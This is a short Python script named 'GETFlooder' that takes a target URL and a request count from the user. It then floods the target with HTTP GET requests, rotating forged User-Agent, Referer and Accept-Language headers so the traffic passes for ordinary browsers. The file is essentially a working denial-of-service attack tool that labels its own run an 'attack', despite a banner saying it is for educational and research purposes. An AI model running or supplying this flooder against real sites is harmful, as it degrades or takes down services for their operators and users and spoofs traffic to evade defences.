import os
import requests
import random
import pyfiglet
from colorama import Fore
from termcolor import colored

os.system("clear")
Banner=pyfiglet.figlet_format("GETFlooder")
banner=colored(Banner,"red")
print(banner)
print(Fore.YELLOW+"          ..:: Made by Aryan Giri ::..")
print()
print(Fore.YELLOW+"  ⚠ This tool is only made for educational & research purposes⚠")
print()
# List of random User-Agent headers
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
]

# List of random Referers
referers = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://duckduckgo.com/",
    "https://www.yahoo.com/",
    "https://www.yandex.com/"
]

# List of random Accept-Language headers
accept_languages = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.8",
    "en-CA,en;q=0.7",
    "fr-FR,fr;q=0.6",
    "de-DE,de;q=0.5"
]

# Function to generate random headers
def generate_headers():
    return {
        "User-Agent": random.choice(user_agents),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": random.choice(accept_languages),
        "Connection": "keep-alive",
        "Referer": random.choice(referers)
    }

# Function to send a single request
def send_request(target_url):
    headers = generate_headers()
    try:
        response = requests.get(target_url, headers=headers)
        print(Fore.GREEN+f"Request sent with headers: {headers} | Status Code: {response.status_code}")
    except Exception as e:
        print(Fore.RED+f"Error: {e}")

# Main function to loop requests
def perform_attack(target_url, request_count):
    for i in range(request_count):
        send_request(target_url)

# User inputs
target_url = input(Fore.GREEN+"Enter the target URL: ")
request_count = int(input(Fore.GREEN+"Enter the number of requests to send: "))

# Start attack
os.system("clear")
Banner=pyfiglet.figlet_format("GETFlooder")
banner=colored(Banner,"red")
print(banner)
print(Fore.YELLOW +"          ..:: Made by Aryan Giri ::..")
print()
print(Fore.YELLOW+"  ⚠ This tool is only made for educational & research purposes⚠")
print()
print(Fore.GREEN+f"press CRTL + C or close terminal to stop attack ")
input("Press Enter to start attack ")
print(Fore.RED+f"Attacking on {target_url} with int{request_count}")
perform_attack(target_url, request_count)
                                             